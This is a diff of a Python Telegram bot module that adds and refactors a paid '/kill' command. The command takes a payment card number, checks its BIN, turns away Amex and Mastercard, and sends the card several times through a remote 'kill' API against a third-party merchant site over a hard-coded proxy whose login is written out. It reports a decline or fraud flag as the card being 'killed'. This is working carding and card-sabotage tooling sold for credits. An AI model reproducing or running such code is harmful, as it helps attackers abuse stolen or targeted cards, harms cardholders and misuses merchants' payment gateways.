@@ -2557,6 +2557,7 @@ from telegram.error import TelegramError
 from bin import get_bin_info
 from db import get_user, update_user
 
+# ---------------- CONFIG ----------------
 KILL_API = (
     "https://rockyog.onrender.com/index.php"
     "?site=https://deltacloudz.com"
@@ -2564,21 +2565,27 @@ KILL_API = (
     "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
 )
 
-COOLDOWN = 5
-ANIM_STEP_DELAY = 0.7
-CHECK_TIMES = 5  # number of API checks
-user_cooldowns = {}
+COOLDOWN = 5                 # per-user cooldown seconds
+ANIM_STEP_DELAY = 0.7        # animation speed (seconds per char)
+CHECK_TIMES = 4              # how many times to check the API
+user_cooldowns = {}          # user_id -> last timestamp
 
-# --- Deduct exactly 5 credits ---
-async def consume_credit(user_id: int, amount: int = 5):
+DEVELOPER_NAME = "kคli liຖนxx"
+DEVELOPER_LINK = "https://t.me/Kalinuxxx"
+developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
+
+# ---------------- credits ----------------
+async def consume_credit(user_id: int, amount: int = 5) -> bool:
+    """Deduct `amount` credits from user. Returns True on success."""
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) >= amount:
         new_credits = user_data["credits"] - amount
+        # Make sure update_user sets/overwrites the field (DB function must do that)
         await update_user(user_id, credits=new_credits)
         return True
     return False
 
-# --- /kill command handler ---
+# ---------------- command entry ----------------
 async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     now = time.time()
@@ -2591,15 +2598,21 @@ async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
+    # set cooldown and schedule background task
     user_cooldowns[user_id] = now
     asyncio.create_task(_kill_task(update, context, user_id))
 
-# --- Main task ---
+
+# ---------------- background worker ----------------
 async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
+    """
+    Background worker: animates a typing-like message while checking the API
+    CHECK_TIMES times. Deducts credits once at the end if available.
+    """
     try:
         start_time = time.time()
 
-        # --- Get card ---
+        # --- get card from args or replied message ---
         if context.args:
             cc = context.args[0].strip()
         elif update.message.reply_to_message and update.message.reply_to_message.text:
@@ -2611,28 +2624,40 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             )
             return
 
-        # --- BIN lookup ---
+        # --- BIN lookup (best-effort) ---
         try:
             bin_number = cc[:6]
-            bin_details = await get_bin_info(bin_number)
-            brand = (bin_details.get("scheme") or "N/A").title()
+            bin_details = await get_bin_info(bin_number) or {}
+            # prefer scheme, then brand fields
+            raw_brand = (bin_details.get("scheme") or bin_details.get("brand") or "")
+            brand_display = raw_brand or "N/A"
+            # normalize for robust matching
+            brand_upper = raw_brand.replace(" ", "").upper()
             issuer = bin_details.get("bank") or "N/A"
             country_name = bin_details.get("country") or "Unknown"
             country_flag = bin_details.get("country_emoji", "")
         except Exception:
-            brand = issuer = "N/A"
+            brand_display = issuer = "N/A"
             country_name = "Unknown"
             country_flag = ""
+            brand_upper = ""
 
-        # --- Only VISA supported ---
-        if brand.upper() in ["AMEX", "MASTERCARD"]:
+        # --- Detect unsupported cards robustly ---
+        if brand_upper in ("AMEX", "AMERICANEXPRESS", "AMERICAN_EXPRESS"):
             await update.message.reply_text(
-                f"⚠️ {brand} detected!\n❌ /kill only supports VISA cards.",
+                "⚠️ American Express detected!\n❌ /kill only supports VISA cards.",
                 parse_mode=ParseMode.HTML
             )
             return
 
-        # --- Check credits ---
+        if brand_upper in ("MASTERCARD", "MASTER", "MASTER_CARD", "MASTERCARDDEBIT"):
+            await update.message.reply_text(
+                "⚠️ Mastercard detected!\n❌ /kill only supports VISA cards.",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        # --- User credit pre-check ---
         user_data = await get_user(user_id)
         if not user_data or user_data.get("credits", 0) < 5:
             await update.message.reply_text(
@@ -2641,25 +2666,35 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             )
             return
 
-        # --- Initial message ---
-        msg = await update.message.reply_text(
-            "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
-            "<pre><code></code></pre>\n"
-            "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫",
-            parse_mode=ParseMode.HTML,
-            disable_web_page_preview=True
-        )
+        # --- Send initial progress message (animation will edit second line) ---
+        try:
+            msg = await update.message.reply_text(
+                "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
+                "<pre><code></code></pre>\n"
+                "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫",
+                parse_mode=ParseMode.HTML,
+                disable_web_page_preview=True
+            )
+        except TelegramError:
+            # if sending the initial message fails, abort gracefully
+            await update.message.reply_text(
+                "❌ Unable to display progress message. Try again later.",
+                parse_mode=ParseMode.HTML
+            )
+            return
 
-        # --- Animate typing ---
-        async def _animate(msg):
+        # --- animation coroutine (loops until cancelled) ---
+        async def _animate_loop(message):
             try:
                 anim_texts = [
                     "⚡𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙤𝙣 𝙄𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜...",
                     "𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧...",
                     "𝙖 𝙬𝙝𝙞𝙡𝙚..."
                 ]
-                for anim_text in anim_texts:
-                    for i in range(len(anim_text)+1):
+                idx = 0
+                while True:
+                    anim_text = anim_texts[idx % len(anim_texts)]
+                    for i in range(1, len(anim_text) + 1):
                         shown = anim_text[:i]
                         text = (
                             "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
@@ -2667,53 +2702,86 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
                             "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫"
                         )
                         try:
-                            await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+                            await message.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
                         except TelegramError:
+                            # ignore edit errors and continue animation
                             pass
                         await asyncio.sleep(ANIM_STEP_DELAY)
+                    idx += 1
             except asyncio.CancelledError:
+                # graceful cancellation when checks finish
                 return
 
-        anim_task = asyncio.create_task(_animate(msg))
+        anim_task = asyncio.create_task(_animate_loop(msg))
 
+        # --- Perform repeated checks (exact CHECK_TIMES times) ---
         api_url = KILL_API.format(full_card=cc)
         final_status = "❌ FAILED / TIMEOUT"
         display_response = "The card could not be killed."
+        success_seen = False
+        last_gateway_msg = ""
 
         async with aiohttp.ClientSession() as session:
-            # --- Check card multiple times ---
             for attempt in range(CHECK_TIMES):
                 try:
                     async with session.get(api_url, timeout=55) as resp:
-                        data = await resp.json()
+                        # try to parse JSON, fallback to raw text
+                        try:
+                            data = await resp.json()
+                        except Exception:
+                            txt = await resp.text()
+                            try:
+                                data = json.loads(txt)
+                            except Exception:
+                                data = {"Response": txt}
                 except Exception:
-                    await asyncio.sleep(2)
+                    # network/timeout error — record and continue
+                    await asyncio.sleep(1)
                     continue
 
-                response = data.get("Response", "").upper()
-                if response in ("CARD_DECLINED", "FRAUD_SUSPECTED"):
+                # normalize response
+                response = (data.get("Response") or data.get("response") or "").upper()
+                last_gateway_msg = data.get("Message") or data.get("message") or data.get("msg") or ""
+
+                if response in ("CARD_DECLINED", "FRAUD_SUSPECTED", "KILLED", "SUCCESS"):
+                    success_seen = True
                     final_status = "✅ 𝗞𝗶𝗹𝗹𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆"
                     display_response = "Your card has been killed successfully."
-                    # Do not break; continue all checks
-                await asyncio.sleep(2)
+                    # continue checking to complete CHECK_TIMES rounds (per requirement)
+                elif response in ("INVALID_CARD", "BAD_REQUEST", "ERROR"):
+                    # set failure reason but still continue the loop to perform all checks
+                    final_status = "❌ FAILED"
+                    display_response = last_gateway_msg or "Gateway returned an unrecoverable error."
+                # small pause between checks so the animation continues smoothly
+                await asyncio.sleep(1)
 
-        # --- Stop animation ---
+        # --- stop animation and wait briefly for any last edit to settle ---
         anim_task.cancel()
-        await asyncio.sleep(0.1)
+        try:
+            await anim_task
+        except asyncio.CancelledError:
+            pass
+        except Exception:
+            pass
 
+        # --- Deduct credits once after checks (attempt even if update fails we just try) ---
+        try:
+            await consume_credit(user_id, 5)
+        except Exception:
+            # ignore credit deduction exceptions (log if you want)
+            pass
+
+        # --- Build final message and edit ---
         elapsed_time = round(time.time() - start_time, 1)
         escaped_card = escape(cc[:6] + "******" + cc[-4:])
-        DEVELOPER_NAME = "kคli liຖนxx"
-        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
-        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
 
-        # --- Send final message ---
         final_text = (
             f"<b><i>{final_status}</i></b>\n\n"
-            f"𝐂𝐚𝐫𝐝\n⤷ <code>{escaped_card}</code>\n"
-            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
+            f"𝐂𝐚𝐫𝐝\n"
+            f"⤷ <code>{escaped_card}</code>\n"
+            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(display_response)}</code></i>\n\n"
             f"<pre>"
-            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
+            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand_display)}\n"
             f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
             f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
             f"</pre>\n\n"
@@ -2721,16 +2789,25 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
         )
 
-        await msg.edit_text(final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-
-        # --- Deduct 5 credits only once after final check ---
-        await consume_credit(user_id, 5)
+        try:
+            await msg.edit_text(final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+        except TelegramError:
+            # fallback: just send the final text as a new message
+            await update.message.reply_text(final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
     except Exception as e:
-        await update.message.reply_text(
-            "❌ Unexpected error while processing /kill.",
-            parse_mode=ParseMode.HTML
-        )
+        # ensure animation cancelled on error
+        try:
+            anim_task.cancel()
+        except Exception:
+            pass
+        try:
+            await update.message.reply_text(
+                "❌ Unexpected error while processing /kill.",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception:
+            pass
         print(f"[ERROR] /kill task failed: {e}")
 
 
